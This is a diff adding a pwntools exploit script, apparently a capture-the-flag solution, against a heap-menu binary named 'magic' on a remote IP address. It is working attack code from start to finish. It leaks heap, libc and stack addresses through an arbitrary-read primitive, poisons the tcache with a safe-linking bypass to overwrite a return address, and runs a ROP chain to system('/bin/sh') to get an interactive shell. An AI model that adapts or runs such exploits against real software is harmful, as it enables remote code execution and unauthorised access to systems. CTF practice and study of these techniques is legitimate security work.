@@ -1,0 +1,90 @@
+from pwn import *
+
+exe = context.binary = ELF('./magic', checksec=False)
+libc = ELF('libc.so.6', checksec=False)
+io = remote('94.237.55.124', 53441)
+
+def update(idx, magic):
+    io.sendlineafter(b'> ', b'1')
+    io.sendlineafter(b'number: ', str(idx).encode())
+    io.sendlineafter(b'number: ', str(magic).encode())
+
+def malloc(spell):
+    io.sendlineafter(b'> ', b'2')
+    io.send(spell)
+
+def free(idx):
+    io.sendlineafter(b'> ', b'3')
+    io.sendlineafter(b'Index: ', str(idx).encode())
+
+def read_fav():
+    io.sendlineafter(b'> ', b'4')
+
+def set_fav(idx, set=True):
+    io.sendlineafter(b'> ', b'5')
+    if not set:
+        io.sendlineafter(b'spell: ', str(idx).encode())
+
+def arb_read(addr):
+    update(2, 0xffffffffffffffff)
+    update(4, addr)
+    set_fav(1)
+    read_fav()
+    io.recvuntil(b':::::-:')
+    io.recvlines(2)
+    return u64(io.recvline().split(b':-:')[1][:8])
+
+io.sendlineafter(b'> ', b'Alohomora')
+
+malloc(b'a' * 0x47 + b'\x0a')
+malloc(b'b' * 0xf7 + b'\x0a')
+free(0)
+update(1, 0)
+set_fav(1, False)
+read_fav()
+io.recvuntil(b'\x51')
+io.recvline()
+HEAP_KEY = u64(io.recvline().split(b'\x00' * 3)[1][1:] + b'\x00' * 3)
+
+for i in range(9):
+    malloc(b'a' * 0x107)
+for i in range(2, 10):
+    free(i)
+
+LIBC_LEAK = arb_read((HEAP_KEY << 12) + 0xb60)
+libc.address = LIBC_LEAK - 0x1d3ce0
+
+STACK_LEAK = arb_read(libc.sym.environ)
+ret_addr = STACK_LEAK - 0x190
+
+update(4, (HEAP_KEY << 12) + 0xb60 + 0x20)
+
+payload = b'a' * 0x10
+payload += flat(0, 0x81)
+payload += b'A' * 0xc0
+malloc(payload)
+
+malloc(b'n' * 0x77)
+free(12)
+free(1)
+free(11)
+
+needed = 0xe0
+payload = b'w' * 0x10
+payload += flat(0x0) + flat(0x81)
+payload += flat(HEAP_KEY ^ (ret_addr-8)) + flat(0xdeadbeef)
+payload += b'r' * (needed - len(payload))
+malloc(payload)
+
+needed = 0x77
+malloc(b'X' * 0x77)
+
+gadgets = ROP(libc)
+payload = b'A' * 0x8
+payload += flat(gadgets.rdi.address) + flat(next(libc.search(b'/bin/sh')))
+payload += flat(gadgets.ret.address)
+payload += flat(libc.sym.system)
+payload += b'A' * (needed - len(payload))
+malloc(payload)
+
+io.interactive()
